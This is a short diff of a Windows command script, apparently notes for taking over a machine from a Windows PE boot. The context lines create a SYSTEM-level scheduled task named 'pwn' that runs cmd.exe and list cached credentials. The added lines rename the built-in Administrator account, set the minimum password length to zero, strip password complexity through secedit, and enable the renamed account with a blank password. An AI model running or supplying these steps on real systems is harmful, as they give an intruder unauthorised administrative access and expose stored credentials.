@@ -4,8 +4,16 @@ wpeutil initializenetwork
 
 schtasks /create /st:$date /SC:Once /RU:SYSTEM /TR:cmd.exe /tn:pwn
 
-net user Administrator /Active:yes
-net user Administrator * #enter, enter
+wmic useraccount where name="Administrator" rename LocalAdmin
+net accounts /MinPwLen:0
+
+secedit /export /cfg C:\temp\policy.cfg
+(Get-Content C:\Temp\policy.cfg).Replace('\PasswordComplexity = 1\','PasswordComplexity = 0') `
+ | Set-Content C:\Temp\policy.cfg
+secedit /configure /db C:\Windows\security\new.sdb /cfg C:\temp\policy.cfg /areas SECURITYPOLICY
+
+net user LocalAdmin /Active:yes
+net user LocalAdmin * #enter, enter
 
 # cached creds
 cmdkey /list 
